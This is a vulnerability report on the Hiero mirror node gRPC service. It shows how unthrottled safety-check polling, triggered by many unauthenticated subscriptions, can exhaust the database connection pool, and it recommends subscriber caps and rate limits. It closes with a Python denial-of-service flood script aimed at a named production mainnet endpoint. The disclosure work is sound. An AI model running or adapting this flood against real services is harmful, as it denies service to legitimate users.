### Title
Unthrottled Safety-Check DB Polling Triggered by Unprivileged Concurrent Subscriptions Exhausts Connection Pool

### Summary
The safety-check branch of `missingMessages()` in `TopicMessageServiceImpl` unconditionally calls `topicMessageRetriever.retrieve(gapFilter, false)` — the unthrottled path — which polls the database up to 12 times at 20 ms intervals with a page size of 5,000 rows. Because there is no enforced limit on the total number of concurrent subscriptions and `maxConcurrentCallsPerConnection` only restricts calls per TCP connection, an unprivileged attacker can open many connections and trigger hundreds of simultaneous unthrottled retrievers, exhausting the HikariCP connection pool and starving legitimate subscribers.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` schedules a one-shot safety check for every subscription:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java, lines 67-70
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
    .filter(_ -> !topicContext.isComplete())
    .flatMapMany(_ -> missingMessages(topicContext, null))
    .subscribeOn(Schedulers.boundedElastic());
```

When `missingMessages()` is called with `current == null` (the safety-check branch), it always invokes the retriever in **unthrottled** mode:

```java
// lines 142-149
if (current == null) {
    ...
    return topicMessageRetriever.retrieve(gapFilter, false);   // throttled=false
}
```

In `PollingTopicMessageRetriever`, `throttled=false` selects the `UnthrottledProperties` configuration:

```java
// PollingTopicMessageRetriever.java, lines 102-107
} else {
    RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
    numRepeats = unthrottled.getMaxPolls();          // default 12
    frequency = unthrottled.getPollingFrequency();   // default 20 ms
    maxPageSize = unthrottled.getMaxPageSize();       // default 5,000
}
```

Critically, `isComplete()` for the unthrottled path only returns `true` when a limit is hit:

```java
// lines 121-128
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;   // unthrottled: only stops at limit or maxPolls
}
```

If the attacker's filter carries no `limit` (the default), `limitHit` is always `false`, so the retriever always exhausts all 12 polls.

The `gapFilter` is built without adding a limit:

```java
// lines 146-147
var gapFilter = topicContext.getFilter().toBuilder().startTime(startTime).build();
```

**Root cause:** The safety-check path is hardwired to unthrottled mode with no guard on the total number of concurrent subscriptions that can trigger it simultaneously.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (NettyProperties, line 14) limits calls *per TCP connection*, not globally. An attacker opens N connections → 5N concurrent subscriptions.
- `subscriberCount` (TopicMessageServiceImpl, line 48) is a Prometheus gauge only — no enforcement, no ceiling.
- No per-IP or per-client rate limiting exists on the gRPC endpoint.
- The `@Validated` constraint on `TopicMessageFilter` only validates field ranges (non-negative startTime, endTime after startTime), not subscription rate.

### Impact Explanation
Each concurrent subscription triggers one unthrottled retriever that issues up to 12 database queries at 20 ms intervals, each fetching up to 5,000 rows. With N connections × 5 calls = 5N subscriptions, the burst is 5N × 12 = 60N queries in ~240 ms. At 100 attacker connections (500 subscriptions), this is 6,000 queries in under 250 ms — enough to saturate a typical HikariCP pool (default 10 connections), blocking all other subscribers from receiving topic messages. The Prometheus alert `GrpcHighDatabaseConnections` fires only after 5 minutes at >75% utilization, providing no real-time protection.

### Likelihood Explanation
The gRPC endpoint is publicly accessible with no authentication. Opening many TCP connections and issuing `subscribeTopic` RPCs requires only a standard gRPC client library and knowledge of the proto schema (publicly available). The attack is repeatable: after the 60-second retriever timeout, the attacker simply reconnects. No special privileges, credentials, or insider knowledge are required.

### Recommendation
1. **Enforce a global subscriber ceiling**: check `subscriberCount` in `subscribeTopic()` and reject new subscriptions above a configurable threshold (e.g., `grpcProperties.getMaxSubscribers()`).
2. **Rate-limit per remote peer**: add a gRPC `ServerInterceptor` that tracks and throttles subscription attempts per source IP.
3. **Bound the safety-check retriever**: pass the remaining limit from the original filter into `gapFilter`, or cap `maxPolls` for the safety-check path independently of the gap-fill path.
4. **Add a global connection limit**: configure Netty's `maxConnectionsPerIp` or use an L7 proxy (already partially present via `maxRatePerEndpoint: 250` in the GCP backend policy) to enforce it at the infrastructure layer as well.

### Proof of Concept
```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc

TARGET = "mirror.mainnet.hedera.com:443"
NUM_CONNECTIONS = 100
CALLS_PER_CONN = 5   # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(CALLS_PER_CONN):
        req = consensus_pb2.ConsensusTopicQuery(
            topicID=...,          # any valid topic ID
            consensusStartTime=0, # no limit field → limitHit always False
        )
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# After ~1 second, 500 unthrottled retrievers fire simultaneously.
# Each issues 12 DB queries at 20 ms → 6,000 queries in ~240 ms.
# HikariCP pool (default 10) is saturated; legitimate subscribers time out.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L142-149)
```java
        if (current == null) {
            long startTime = last != null
                    ? last.getConsensusTimestamp() + 1
                    : topicContext.getFilter().getStartTime();
            var gapFilter =
                    topicContext.getFilter().toBuilder().startTime(startTime).build();
            log.info("Safety check triggering gap recovery query with filter {}", gapFilter);
            return topicMessageRetriever.retrieve(gapFilter, false);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L102-107)
```java
            } else {
                RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
                numRepeats = unthrottled.getMaxPolls();
                frequency = unthrottled.getPollingFrequency();
                maxPageSize = unthrottled.getMaxPageSize();
            }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L36-47)
```java
    public static class UnthrottledProperties {

        @Min(1000)
        private int maxPageSize = 5000;

        @Min(4)
        private long maxPolls = 12;

        @DurationMin(millis = 10)
        @NotNull
        private Duration pollingFrequency = Duration.ofMillis(20);
    }
```
